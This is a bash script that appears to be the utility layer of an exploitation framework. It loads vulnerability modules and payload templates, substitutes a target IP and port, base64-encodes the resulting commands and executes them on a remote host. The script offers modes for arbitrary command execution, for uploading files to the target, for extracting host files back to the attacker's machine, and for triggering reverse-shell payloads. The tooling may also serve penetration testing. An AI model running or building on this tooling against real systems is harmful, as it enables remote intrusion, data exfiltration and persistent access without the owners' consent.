#!/usr/bin/env bash
set -euo pipefail

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$BASE_DIR/themes/theme.sh"

#upload user design utils (optional from themes.sh)

warning "${BOLD}${CYAN}[*] Utility Mode Loaded${RESET}"


#varibales for urility commands
VULN=""
PAYLOAD_KEY=""
FILE_ARG=""
OUTPUT_DIR=$BASE_DIR/utility/output
encoded=""
DEST_ARG=""
FILE_ARG=""
SOURCE_ARG=""
IP_ARG=""
PORT_ARG=""
CMD_VALUE=""
direct_command_mode_active=""
OUT_ARG=""




#base64 encode function 
b64_encode() {
    local cmd="$*"
    printf "%s" "$cmd" | base64 | tr -d '\n'
}

#help function 
show_help() {
    banner
    matrix 0.01 
    echo -e "${BOLD}${CYAN}USAGE:${RESET}"
    echo -e "  $(basename "$0") [OPTIONS]"

    echo -e "\n${BOLD}${CYAN}REQUIRED:${RESET}"
    echo -e "  ${YELLOW}--vuln <name>${RESET}           Select vulnerability module"
    echo -e "  ${YELLOW}--<payload_key>${RESET}        Use specific payload action"

    echo -e "\n${BOLD}${CYAN}COMMON OPTIONS:${RESET}"
    echo -e "  ${YELLOW}--ip <address>${RESET}         Target IP for payloads"
    echo -e "  ${YELLOW}--port <number>${RESET}         Target port for payloads"
    echo -e "  ${YELLOW}--file <path>${RESET}           Local file used by payloads"
    echo -e "  ${YELLOW}--source <path>${RESET}         Source path on host/container"
    echo -e "  ${YELLOW}--dest <path>${RESET}           Destination path on host"
    echo -e "  ${YELLOW}--out <file>${RESET}            Save base64 output"
    echo -e "  ${YELLOW}--decode-out <file>${RESET}      Decode base64 output (dangerous)"

    echo -e "\n${BOLD}${CYAN}DISCOVERY OPTIONS:${RESET}"
    echo -e "  ${YELLOW}--list-vulns${RESET}            Show all vulnerability modules"
    echo -e "  ${YELLOW}--list-payloads${RESET}         Show all payload keys"

    echo -e "\n${BOLD}${CYAN}MISC:${RESET}"
    echo -e "  ${YELLOW}--help, -h${RESET}              Display this help menu"

    echo -e "\n${DIM}${WHITE}All operations are logged using the theme’s info/error/success format.${RESET}"
}

# clean base64 data for extract utility 
base64_cleaner() {
    local input="$1"
    local data=""

    # ------------------------------
    # Read file OR raw string input
    # ------------------------------
    if [[ -f "$input" ]]; then
        data="$(cat "$input")"
    else
        data="$input"
    fi

    

    #data="$(printf "%s" "$data" | tr -d '\000-\011\013\014\016-\037\177')"

   
    # Keep ONLY base64-valid chars
    data="$(printf "%s" "$data" | tr -cd 'A-Za-z0-9+/=')"
    # Optional: show raw input

    BANNED_WORDS=("BEGINEXTRACT" "ENDEXTRACT")

    for bad in "${BANNED_WORDS[@]}"; do
        data="${data//$bad/}"
    done
    # Output cleaned base64
    printf "%s" "$data"
}


# ensure argument validation
validate(){

    if [[ -z "$VULN" ]]; then
        error "[!] No --vuln provided"
        hint "Use --list-vulns to print all vulns"
        show_help
        exit 1
    fi

    if [[ -z "$PAYLOAD_KEY" ]]; then
        error "[!] Missing required payload action (--run, --upload, --id, ...) "
        hint "use --list-payloads to see actions "
        show_help
        exit 1
    fi
    info "[*] VULN = $VULN"
    info "[*] PAYLOAD = $PAYLOAD_KEY  FILE = $FILE_ARG"

}




# LOAD MODULE FROM vuln.conf
load_modules(){
    VULN_CONF="$BASE_DIR/config/vuln.conf"
    info "[*] Using VULN_CONF = $VULN_CONF"

    if [[ ! -f "$VULN_CONF" ]]; then
        error "[!] Missing $VULN_CONF"
        exit 1
    fi

    MODULE_PATH=$(grep "^$VULN=" "$VULN_CONF" | cut -d= -f2- || true)

    if [[ -z "$MODULE_PATH" ]]; then
        error "[!] '$VULN' arg not found in $VULN_CONF"
        show_help
        exit 1
    fi

    # Normalize path
    if [[ "$MODULE_PATH" != /* ]]; then
        MODULE_PATH="$BASE_DIR/$MODULE_PATH"
    fi

    success "[*] MODULE_PATH resolved = $MODULE_PATH"

    if [[ ! -f "$MODULE_PATH" ]]; then
        error "[!] Module file missing: $MODULE_PATH"
        exit 1
    fi

    hint "[*] Sourcing module: $MODULE_PATH"
    source "$MODULE_PATH"

    if ! declare -F utility-exec-function >/dev/null; then
        error "[!] Module does NOT define utility-exec-function()"
        exit 1
    fi

    success "[*] Module sourced OK"

}



# LOAD PAYLOAD CONFIG payload.conf

load_config(){
    CONFIG_FILE="$BASE_DIR/config/payload.conf"
    info "[*] Using CONFIG_FILE = $CONFIG_FILE"

    if [[ ! -f "$CONFIG_FILE" ]]; then
        error "[!] Config file missing: $CONFIG_FILE"
        exit 1
    fi

    source "$CONFIG_FILE"
    success "[*] Config loaded OK"

    CMD_VALUE="${!PAYLOAD_KEY:-}"

    if [[ -z "$CMD_VALUE" ]]; then
        error "[!] Payload '$PAYLOAD_KEY' not found in: $CONFIG_FILE"
        exit 1
    fi

    info "[*] RAW COMMAND FROM CONFIG = '$CMD_VALUE'"

}


#function to detetct files pattern /PATH/TO/FILE 
detect_file_pattern(){
    requires_file=false

    # detect file placeholder only
    if [[ "$CMD_VALUE" =~ PATH/TO/FILE ]]; then
        requires_file=true
    fi

    if $requires_file; then
        if [[ -z "$FILE_ARG" ]]; then
            warning "[WARN] Command requires a file but no --file provided"
            warning "[*] FILE OPTIONAL MODE → continue anyway"
        else
            CMD_VALUE="${CMD_VALUE//PATH\/TO\/FILE/$FILE_ARG}"
        fi
    fi
}


# DETECT IP/PORT pattern and replace it with user values format (/IP/ & /PORT/)
detect_ip-port_pattern(){
    require_IP=false
    require_PORT=false

    [[ "$CMD_VALUE" =~ IP ]] && require_IP=true
    [[ "$CMD_VALUE" =~ PORT ]] && require_PORT=true

    if $require_IP; then
        if [[ -z "$IP_ARG" ]]; then
            error "[WARN] Payload requires IP but --ip missing"
            exit 1
        else
            CMD_VALUE="${CMD_VALUE//IP/$IP_ARG}"
        fi
    fi

    if $require_PORT; then
        if [[ -z "$PORT_ARG" ]]; then
            error "[WARN] Payload requires PORT but --port missing"
            exit 1
        else
            CMD_VALUE="${CMD_VALUE//PORT/$PORT_ARG}"
        fi
    fi
    encoded=$(b64_encode "$CMD_VALUE")
    hint "[*] FINAL COMMAND TO EXECUTE = '$encoded' (base64 encoded)"
}





#Upload files utility 
upload_utility(){

    if [[ "$PAYLOAD_KEY" == "upload_file" ]]; then
        if [[ -z "$FILE_ARG" ]]; then
            error "upload_file requires --file <path>"
            exit 1
        fi

        if [[ -z "$DEST_ARG" ]]; then
            error "upload_file requires --dest <path>"
            exit 1
        fi


        if [[ ! -f "$FILE_ARG" ]]; then
            error "File not found: $FILE_ARG"
            exit 1
        fi
        info "[*] Reading local file: $FILE_ARG"

        # read and base64 encode file content
        CONTENT_B64=$(base64 -w 0 "$FILE_ARG")
        CMD_VALUE="${CMD_VALUE//\{\{CONTENT\}\}/$CONTENT_B64}"
        CMD_VALUE="${CMD_VALUE//\{\{DEST\}\}/$DEST_ARG}"

        warning "cmd value after dest replace dest: $CMD_VALUE"
        encoded=$(b64_encode "$CMD_VALUE")
    fi

}





# EXTRACT FILE (HOST → LOCAL MACHINE)
extract_file(){
    if [[ "$PAYLOAD_KEY" == "extract_file" ]]; then
        
        if [[ -z "$SOURCE_ARG" ]]; then
            error "extract_file requires --source <host path>"
            exit 1
        fi

        if [[ -z "$OUT_ARG" ]]; then
            error "extract_file requires --out <local filename>"
            exit 1
        fi

        info "[*] Extracting host file: $SOURCE_ARG"
        info "[*] Output will be saved to: $OUT_ARG"

        # Replace placeholder in payload.conf
        CMD_VALUE="${CMD_VALUE//\{\{SOURCE\}\}/$SOURCE_ARG}"
        warning "[*] Final command to execute on host:"
        echo "$CMD_VALUE"   
        encoded=$(b64_encode "$CMD_VALUE")
        utility-exec-function "$encoded"
    
        base64_out=$(base64_cleaner "$output")
        RANDOM_STR=$(date +%s%N | sha256sum | head -c16)
        if [[ -z "$OUTPUT_DIR" ]]; then
            echo "[ERR] output directory not set"
            makedir -p "$OUTPUT_DIR"
            exit 1
        fi

        if [[ -n "${DECODE_OUT_ARG:-}" ]]; then
            echo "[*] Decoding base64 output to: $OUTPUT_DIR/$DECODE_OUT_ARG-$RANDOM_STR.decoded"

            if base64 --help >/dev/null 2>&1; then
                printf '%s' "$base64_out" | base64 --decode > "$OUTPUT_DIR/$DECODE_OUT_ARG-$RANDOM_STR.decoded"
            else
                printf '%s' "$base64_out" | base64 -d > "$OUTPUT_DIR/$DECODE_OUT_ARG-$RANDOM_STR.decoded"
            fi

            success "[+] Decoded file saved: $OUTPUT_DIR/$DECODE_OUT_ARG-$RANDOM_STR.decoded"
            exit 0
        fi

        
        printf '%s' "$base64_out" > "$OUTPUT_DIR/$OUT_ARG-$RANDOM_STR"
        
        success "[+] Encoded File saved: $OUTPUT_DIR/$OUT_ARG-$RANDOM_STR"
        exit 0
    fi
}


# list payloads from config file
list_payloads() {
    local payloads_file="$BASE_DIR/config/payload.conf"
    
    if [[ ! -f "$payloads_file" ]]; then
        error "[ERR] Payload config not found: $payloads_file"
        exit 1
    fi
    info "Available Payload Keys from $payloads_file"
    info "[*] Available Payload Keys:"
    echo

    # parse only: key= , ignoring comments & empty lines
    grep -E '^[a-zA-Z0-9_-]+=' "$payloads_file" \
        | cut -d= -f1 \
        | while read -r key; do
            echo -e "  ${CYAN}- ${GREEN}$key${RESET}"
        done

    echo
}

# list vuln modules from config file
list_vulns() {
    local vulns_file="$BASE_DIR/config/vuln.conf"
    
    if [[ ! -f "$vulns_file" ]]; then
        error "[!] Vuln modules config not found: $vulns_file"
        exit 1
    fi
    info "Available Payload Keys from $vulns_file"
    info "[*] Available Payload Keys:"
    echo

    # parse only: key= , ignoring comments & empty lines
    grep -E '^[a-zA-Z0-9_-]+=' "$vulns_file" \
        | cut -d= -f1 \
        | while read -r key; do
            echo -e "  ${CYAN}- ${GREEN}$key${RESET}"
        done

    echo
}

# execute command directly
execute_direct_cmd() {
    local cmd="$1"

    # encode to b64 safely
    encoded=$(printf "%s" "$cmd" | base64 -w 0)

    utility-exec-function "$encoded"
}

# no argument provided
if [[ $# -eq 0 ]]; then
    show_help
    exit 0
fi

# ---------------------------------
# ARGUMENT PARSER
# ---------------------------------
while [[ $# -gt 0 ]]; do
    case "$1" in
        --help|-h)
            show_help
            exit 0
            ;;
        --vuln)
            if [[ $# -ge 2 && ! "$2" =~ ^-- ]]; then
                VULN="$2"
                shift 2
            else
                show_help
                error "[!] Missing value for --vuln <value>"
                
                exit 1
            fi
        ;;
        --cmd)
            if [[ $# -ge 2 ]]; then
                PAYLOAD_KEY="cmd"
                RAW_CMD="$2"
                shift 2
            else
                show_help
                error "[!] Missing value for --cmd <command>"
                
                exit 1
            fi
        ;;
        --ip)
            if [[ $# -ge 2 && ! "$2" =~ ^-- ]]; then
                IP_ARG="$2"
                shift 2
            else
                show_help
                error "[ERR] Missing value for --ip <value>"
                exit 1
            fi
        ;;
        --list-payloads)
            list_payloads
            exit 0
        ;;
        --list-vulns|-lv)
            list_vulns
            exit 0

        ;;
        --port)
            if [[ $# -ge 2 && ! "$2" =~ ^-- ]]; then
                PORT_ARG="$2"
                shift 2
            else
                show_help
                error "[ERR] Missing value for --port <value>"
                exit 1
            fi
        ;;
        --dest)
            if [[ $# -ge 2 ]]; then
                DEST_ARG="$2"
                shift 2
            else
                show_help   
                error "[ERR] Missing value for --dest <path>"
                
                exit 1
            fi
            
        ;;
        --source)
            if [[ $# -ge 2 ]]; then
                SOURCE_ARG="$2"
                shift 2
            else
                show_help
                error "[ERR] Missing value for --source <host path>"
                
                exit 1
            fi
        ;;
        --out)
            if [[ $# -ge 2 ]]; then
                info "--out detected! this will save file encoded to base64 wich is good for large files and security"
                OUT_ARG="$2"
                shift 2
            else
                show_help
                error "[ERR] Missing value for --out <local filename>"
                exit 1
            fi
        ;;  
        --decode-out)
            if [[ $# -ge 2 ]]; then
            warning "DENGEROUS MODE ENABLED: --decode-out will save DECODED file to local disk in it's original form! this not safe!   "
                DECODE_OUT_ARG="$2"
                shift 2
            else
                show_help
                error "[ERR] Missing value for --decode-out <filename>"
                
                exit 1
            fi
        ;;
        --file)
            if [[ $# -ge 2 ]]; then
                FILE_ARG="$2"
                shift 2
            else
                show_help
                error "[ERR] Missing value for --file <file path>"
                
                exit 1
            fi
        ;;
        --*)
            # Any --xxx is a PAYLOAD KEY
            PAYLOAD_KEY="${1#--}"
            shift
        ;;
        *)
            shift
        ;;
    esac
done




# ---------------------------------
# main
# ---------------------------------

 
load_modules
validate


# execute command directly without loading paylod config file
if [[ "$PAYLOAD_KEY" == "cmd" ]]; then
    direct_command_mode_active=true
fi

# load config file while no direct command provided 
if [[ "$direct_command_mode_active" != true ]]; then
    load_config
else
    info "[*] Direct command: skipping payload.conf"
fi

# run command directly 
if [[ "$PAYLOAD_KEY" == "cmd" ]]; then
    info "[*] Direct command mode"
    execute_direct_cmd "$RAW_CMD"
    exit 0
fi


# 1 — UPLOAD mode
if [[ "$PAYLOAD_KEY" == "upload_file" ]]; then
    detect_file_pattern
    upload_utility
    warning "[*] Executing utility-exec-function..."
    utility-exec-function "$encoded"    
    exit 0
fi

# 2 — EXTRACT mode
if [[ "$PAYLOAD_KEY" == "extract_file" ]]; then
    extract_file
    warning "[*] Executing utility-exec-function..."
    exit 0
fi


# 4 — Normal payloads (revshell, list, run, etc)
detect_file_pattern
detect_ip-port_pattern
    
utility-exec-function "$encoded"


# required in the module:
b64_decode() {
    local b64="$*"
    printf "%s" "$b64" | base64 --decode
}
